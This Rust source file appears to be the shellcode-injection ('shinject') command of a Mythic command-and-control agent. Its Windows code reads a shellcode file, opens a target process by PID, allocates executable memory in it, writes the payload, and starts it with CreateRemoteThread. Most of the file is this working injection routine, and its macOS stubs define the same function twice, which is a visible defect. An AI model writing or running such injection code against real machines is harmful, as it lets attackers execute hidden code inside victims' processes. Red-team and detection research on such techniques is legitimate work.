use std::mem;
use std::ptr;
use crate::{AgentTask, mythic_success, mythic_error};
use crate::agent::ShinjectArgs;
use base64::{Engine as _, engine::general_purpose};

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
#[cfg(target_os = "windows")]
use winapi::shared::basetsd::SIZE_T;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(target_os = "windows")]
use winapi::um::winbase::WAIT_OBJECT_0;

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
#[cfg(target_os = "windows")]
const MEM_COMMIT: DWORD = 0x1000;
#[cfg(target_os = "windows")]
const MEM_RESERVE: DWORD = 0x2000;
#[cfg(target_os = "windows")]
const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
#[cfg(target_os = "windows")]
const INFINITE: DWORD = 0xFFFFFFFF;

// ========================================
// Main command execution for Mythic
// ========================================
#[cfg(target_os = "windows")]
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    // Parse arguments from task parameters
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;

    // The shellcode field contains the file ID from Mythic
    // We need to download the file from Mythic first
    // For now, we'll try to read the file from common locations
    // In a real implementation, you would use Mythic's file download mechanism
    
    let mut shellcode_bytes = Vec::new();
    
    // Try to read the file from various possible locations
    let possible_paths = vec![
        std::path::Path::new(&args.shellcode),
        std::env::temp_dir().join(&args.shellcode),
        std::env::current_dir()?.join(&args.shellcode),
    ];
    
    let mut found_file = false;
    for path in possible_paths {
        if path.exists() {
            match std::fs::read(path) {
                Ok(bytes) => {
                    shellcode_bytes = bytes;
                    found_file = true;
                    break;
                }
                Err(_) => continue,
            }
        }
    }
    
    if !found_file {
        return Ok(mythic_error!(
            task.id,
            format!("Shellcode file '{}' not found. Please ensure the file is uploaded to Mythic and downloaded to the agent first.", args.shellcode)
        ));
    }

    unsafe {
        match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
            Ok(output) => Ok(mythic_success!(task.id, output)),
            Err(e) => Ok(mythic_error!(task.id, e)),
        }
    }
}

// ========================================
// Windows shellcode injection implementation
// ========================================
#[cfg(target_os = "windows")]
unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if h_process.is_null() {
        return Err(format!(
            "Failed to open process with PID: {}. Error: {}",
            process_id,
            GetLastError()
        ));
    }

    let buffer_size = shellcode.len();
    let remote_mem = VirtualAllocEx(
        h_process,
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        CloseHandle(h_process);
        return Err("VirtualAllocEx failed".to_string());
    }

    let mut bytes_written: SIZE_T = 0;
    let write_result = WriteProcessMemory(
        h_process,
        remote_mem,
        shellcode.as_ptr() as LPVOID,
        buffer_size,
        &mut bytes_written,
    );

    if write_result == 0 || bytes_written != buffer_size {
        CloseHandle(h_process);
        return Err(format!(
            "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}",
            bytes_written,
            buffer_size,
            GetLastError()
        ));
    }

    let mut thread_id: DWORD = 0;
    let h_thread = CreateRemoteThread(
        h_process,
        ptr::null_mut(),
        0,
        Some(mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if h_thread.is_null() {
        CloseHandle(h_process);
        return Err("CreateRemoteThread failed".to_string());
    }

    let wait_result = WaitForSingleObject(h_thread, INFINITE);

    // Clean up
    CloseHandle(h_thread);
    CloseHandle(h_process);

    if wait_result == WAIT_OBJECT_0 {
        Ok(format!(
            "Shellcode successfully injected into PID {}. Thread ID: {}",
            process_id, thread_id
        ))
    } else {
        Err(format!("WaitForSingleObject failed with result: {}", wait_result))
    }
}

// ========================================
// macOS placeholder implementation
// ========================================
#[cfg(target_os = "macos")]
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(
        task.id,
        "shinject command is not implemented for macOS"
    ))
}

// ========================================
// Fallback for other platforms
// ========================================
#[cfg(not(target_os = "windows"))]
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(
        task.id,
        "shinject command is only supported on Windows"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let args = ShinjectArgs {
            shellcode: "test_file_id".to_string(),
            process_id: 1234,
        };
        assert_eq!(args.shellcode, "test_file_id");
        assert_eq!(args.process_id, 1234);
    }
}
